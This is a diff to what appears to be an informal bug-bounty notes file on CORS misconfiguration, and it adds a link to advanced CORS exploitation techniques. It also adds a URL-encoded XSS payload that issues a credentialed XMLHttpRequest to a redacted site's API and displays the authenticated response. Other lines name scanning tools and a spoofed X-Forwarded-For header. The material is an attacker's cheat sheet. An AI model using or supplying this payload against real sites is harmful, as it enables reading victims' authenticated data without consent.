@@ -52,7 +52,11 @@ python3 corsy.py -u https://example.com/
 -and payalod cros
 *.[crospayalor](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CORSMisconfiguration/README.md)
 
--
+#advancebypasscroslink
+```
+https://infosecwriteups.com/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397
+```
+-the end 
 
 >scan parampeter
 > old parameter ,1-gau 2-paramspider
@@ -1124,6 +1128,13 @@ python3 -m http.server -m 80
 X-Forwarded-For: 1.1.1.1
 
 ```
+->
+-xss to cros and [link](#advancebypasscroslink)
+
+```
+<script>function%20cors(){var%20xhttp=new%20XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200) alert(this.responseText);document.getElementById("demo").innerHTML=this.responseText}};xhttp.open("GET","https://www.redacted.com/api/return",true);xhttp.withCredentials=true;xhttp.send()}cors();</script>
+```
+
 # the end
 
 -
